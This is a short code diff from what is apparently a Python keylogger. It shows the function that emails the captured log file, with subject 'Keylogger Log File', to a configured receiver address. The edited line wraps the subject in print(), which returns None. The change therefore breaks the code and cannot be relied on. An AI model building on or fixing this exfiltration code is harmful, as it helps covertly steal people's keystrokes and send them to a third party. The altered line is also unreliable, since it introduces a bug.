@@ -31,7 +31,7 @@ def send_log_via_email():
     msg = MIMEMultipart()
     msg['From'] = config.SENDER_EMAIL
     msg['To'] = config.RECEIVER_EMAIL
-    msg['Subject'] = f"Keylogger Log File - {time_stamp}"
+    msg['Subject'] = print(f"Keylogger Log File - {time_stamp}")
 
     body = MIMEText(log_content, 'plain')
     msg.attach(body)
